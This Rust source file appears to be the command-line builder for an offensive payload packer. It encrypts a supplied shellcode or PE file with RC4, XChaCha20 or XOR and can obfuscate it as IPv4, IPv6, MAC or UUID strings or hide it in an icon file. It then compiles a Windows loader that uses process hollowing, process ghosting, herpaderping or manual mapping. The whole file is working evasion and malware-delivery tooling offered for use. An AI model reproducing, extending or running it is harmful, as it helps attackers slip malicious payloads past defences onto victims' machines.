use std::{env::set_current_dir, path::PathBuf, vec};

use clap::{Parser, ValueEnum};
use figlet_rs::FIGfont;

use shared::crypt::*;

const NAME: &str = "..";

enum ObfuscationResult {
    Raw(Vec<u8>),
    ObfuscatedStrings(Vec<String>),
}

#[derive(Clone, Debug, ValueEnum, PartialEq)]
enum Mode {
    Shellcode,
    Pe,
    Dotnet,
}

#[derive(Clone, Debug, ValueEnum)]
enum Technique {
    Direct,
    Hypnosis,
    ManualMap,
    ProcessHollowing,
    ProcessHerpaderping,
    ProcessGhosting,
    GhostlyHollowing,
    HerpaderplyHollowing,
}

#[derive(Clone, Debug, ValueEnum)]
enum Encrypt {
    Rc4,
    Chacha20,
    Xor,
    None,
}

#[derive(Clone, Debug, ValueEnum)]
enum Obfuscation {
    IPV4,
    IPV6,
    MAC,
    UUID,
    None,
}

#[derive(Parser, Debug)]
#[command(name = NAME)]
#[command(version = "0.1.0")]
#[command(about = "PE, Shellcode and assembly packer")]
struct Cli {
    #[arg(long, required = true, short = 'i')]
    input: String,

    #[arg(long, value_enum, required = true, ignore_case = true, short = 'm')]
    mode: Mode,

    #[arg(long, value_enum, required = true, ignore_case = true, short = 't')]
    technique: Technique,

    #[arg(long, short = 'e', value_enum, default_value_t = Encrypt::None)]
    encrypt: Encrypt,

    #[arg(long, alias = "obf", value_enum, default_value_t = Obfuscation::None)]
    obfuscation: Obfuscation,

    #[arg(long, alias = "rs", default_value_t = false)]
    resource: bool,

    #[arg(long, default_value_t = false)]
    dll: bool,

    #[arg(long, alias = "export")]
    dll_export: Option<String>,

    #[arg(long, alias = "args")]
    pe_args: Option<String>,
}

fn process_encryption(
    method: &Encrypt,
    contents: &[u8],
    features: &mut Vec<String>,
) -> (Vec<u8>, Vec<u8>, Vec<u8>) {
    let mut key = shared::crypt::CryptoUtils::generate_bytes(32);
    let mut nonce = vec![];
    let encrypted = match method {
        Encrypt::Rc4 => {
            features.push("rc4".to_string());
            shared::crypt::CryptoUtils::rc4_crypt(contents, &key)
        }
        Encrypt::Chacha20 => {
            nonce = shared::crypt::CryptoUtils::generate_bytes(24);
            features.push("chacha20".to_string());
            shared::crypt::CryptoUtils::xchacha20_encrypt(contents, &key, &nonce, 0)
        }
        Encrypt::Xor => {
            features.push("xor".to_string());
            shared::crypt::CryptoUtils::xor_crypt(contents, &key)
        }
        Encrypt::None => {
            key = vec![];
            contents.to_vec()
        }
    };

    (encrypted, key, nonce)
}

fn process_obfuscation(
    method: &Obfuscation,
    contents: &[u8],
    features: &mut Vec<String>,
) -> ObfuscationResult {
    use Obfuscation::*;
    match method {
        None => ObfuscationResult::Raw(contents.to_vec()),
        IPV4 => {
            features.push("ipv4".into());
            let strings = shared::obf::obfuscate_ipv4(contents.to_vec());
            ObfuscationResult::ObfuscatedStrings(strings)
        }
        IPV6 => {
            features.push("ipv6".into());
            let strings = shared::obf::obfuscate_ipv6(contents.to_vec());
            ObfuscationResult::ObfuscatedStrings(strings)
        }
        MAC => {
            features.push("mac".into());
            let strings = shared::obf::obfuscate_mac(contents.to_vec());
            ObfuscationResult::ObfuscatedStrings(strings)
        }
        UUID => {
            features.push("uuid".into());
            let strings = shared::obf::obfuscate_uuid(contents.to_vec());
            ObfuscationResult::ObfuscatedStrings(strings)
        }
    }
}

fn print_error_and_exit(msg: &str) -> ! {
    eprintln!("{}", msg);
    std::process::exit(1);
}

fn main() {
    let mut payload_stub = String::new();
    let mut features: Vec<String> = vec![];

    let args = Cli::parse();

    let standard_font =
        FIGfont::standard().unwrap_or_else(|_| print_error_and_exit("Failed to load ASCII font"));

    let figure = standard_font.convert(NAME);
    if let Some(ref ascii_art) = figure {
        println!("{}", ascii_art);
    }

    let contents = std::fs::read(&args.input).unwrap_or_else(|err| {
        print_error_and_exit(&format!("Error reading file '{}': {}", &args.input, err))
    });

    let (contents, key, nonce) = process_encryption(&args.encrypt, &contents, &mut features);

    if key.len() > 0 {
        payload_stub = format!("pub static ENCRYPTION_KEY: &[u8] = &{:?};\n", key);
    }
    if nonce.len() > 0 {
        payload_stub = format!(
            "{}pub static ENCRYPTION_NONCE: &[u8] = &{:?};\n",
            payload_stub, nonce
        );
    }

    let obfuscated = process_obfuscation(&args.obfuscation, &contents, &mut features);
    if args.resource {
        features.push("resource".to_string());

        let raw_bytes = match obfuscated {
            ObfuscationResult::Raw(ref bytes) => bytes.clone(),
            ObfuscationResult::ObfuscatedStrings(ref lines) => {
                lines.join("\n").into_bytes() // UTF-8 encode joined string data
            }
        };

        std::fs::write("loader/assets/icon.ico", raw_bytes).unwrap_or_else(|err| {
            print_error_and_exit(&format!("Error writing resource: {}", err))
        });

        // Do NOT append ENCPAYLOAD to payload_stub in resource mode
    } else {
        match obfuscated {
            ObfuscationResult::Raw(ref bytes) => {
                payload_stub = format!(
                    "{}pub static ENCPAYLOAD: &[u8] = &{:?};",
                    payload_stub, &bytes
                );
            }
            ObfuscationResult::ObfuscatedStrings(ref lines) => {
                payload_stub = format!(
                    "{}pub static ENCPAYLOAD: &[&str] = &{:?};",
                    payload_stub, &lines
                );
            }
        };
    }

    if args.mode == Mode::Pe {
        payload_stub = format!(
            "{}\npub static PE_ARGS: &str = \"{}\";\n",
            payload_stub,
            args.pe_args.unwrap_or("".to_owned())
        )
    } else {
        payload_stub = format!("{}\npub static PE_ARGS: &str = \"\";\n", payload_stub);
    }

    std::fs::write("loader/src/payload.rs", payload_stub).unwrap_or_else(|err| {
        print_error_and_exit(&format!("Error writing payload file: {}", err))
    });

    let mut lib_rs_backup: Option<String> = None;

    let mut compile_command = String::new();
    compile_command.push_str(" build --release --no-default-features ");

    if args.dll {
        compile_command.push_str("--lib ");
        features.push("dll".to_owned());
        if let Some(export_name) = args.dll_export.as_ref() {
            let lib_rs_path = "loader/src/lib.rs";

            // Backup original
            let original = std::fs::read_to_string(lib_rs_path).unwrap_or_else(|err| {
                print_error_and_exit(&format!("Error reading lib.rs: {}", err))
            });
            lib_rs_backup = Some(original.clone());

            // Replace placeholder
            let modified = original.replace("EXPORT_PLACEHOLDER", export_name);

            std::fs::write(lib_rs_path, modified).unwrap_or_else(|err| {
                print_error_and_exit(&format!("Failed to write lib.rs with export name: {}", err))
            });
        } else {
            features.push("dll_main".to_owned());
        }
    } else {
        if args.dll_export.is_some() {
            print_error_and_exit("--dll must be enabled to use --dll-export.");
        }
        compile_command.push_str("--bin loader ");
    }

    match args.mode {
        Mode::Shellcode => match args.technique {
            Technique::Direct => {
                features.push("shellcode_direct".to_string());
            }
            Technique::Hypnosis => {
                features.push("shellcode_hypnosis".to_string());
            }
            Technique::ProcessHollowing => {
                features.push("shellcode_processhollowing".to_string());
            }
            _ => print_error_and_exit("Selected technique is invalid for shellcode mode"),
        },
        Mode::Pe => match args.technique {
            Technique::ManualMap => {
                features.push("pe_manualmap".to_string());
            }
            Technique::ProcessHollowing => {
                features.push("pe_processhollowing".to_string());
            }
            Technique::ProcessGhosting => {
                features.push("pe_processghosting".to_string());
            }
            Technique::GhostlyHollowing => {
                features.push("pe_ghostlyhollowing".to_string());
            }
            Technique::ProcessHerpaderping => {
                features.push("pe_processherpaderping".to_string());
            }
            Technique::HerpaderplyHollowing => {
                features.push("pe_herpaderplyhollowing".to_string());
            }
            _ => print_error_and_exit("Selected technique is invalid for PE mode"),
        },
        Mode::Dotnet => match args.technique {
            _ => print_error_and_exit("Selected technique is invalid for .NET mode"),
        },
    }

    if !features.is_empty() {
        compile_command.push_str(" --features ");
        compile_command.push_str(&features.join(","));
    }
    compile_command.push_str(" --manifest-path ./loader/Cargo.toml");

    // Determine the target
    #[cfg(not(target_os = "linux"))]
    let target = "x86_64-pc-windows-msvc";

    #[cfg(target_os = "linux")]
    let target = "x86_64-pc-windows-gnu";

    compile_command.push_str(" --target ");
    compile_command.push_str(target);

    println!("Compile command: {}", compile_command);

    let mut path_to_cargo_project = std::env::current_dir().unwrap();
    compiler(&mut path_to_cargo_project, &compile_command).expect("Failed to compile loader");

    if let Some(backup) = lib_rs_backup {
        std::fs::write("loader/src/lib.rs", backup).unwrap_or_else(|err| {
            print_error_and_exit(&format!("Failed to restore original lib.rs: {}", err));
        });
    }
}

fn compiler(
    path_to_cargo_project: &mut PathBuf,
    compile_command: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    set_current_dir(path_to_cargo_project)?;
    let output = std::process::Command::new("cargo")
        .env(
            "RUSTFLAGS",
            "-C opt-level=z -C debuginfo=0 -C panic=abort -Z location-detail=none",
        )
        .args(compile_command.split_whitespace())
        .output()?;

    println!("stderr: {}", String::from_utf8_lossy(&output.stderr));

    if output.status.success() {
        Ok(())
    } else {
        println!("[-] Failed to compile!");
        Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            String::from_utf8_lossy(&output.stderr).to_string(),
        )))
    }
}
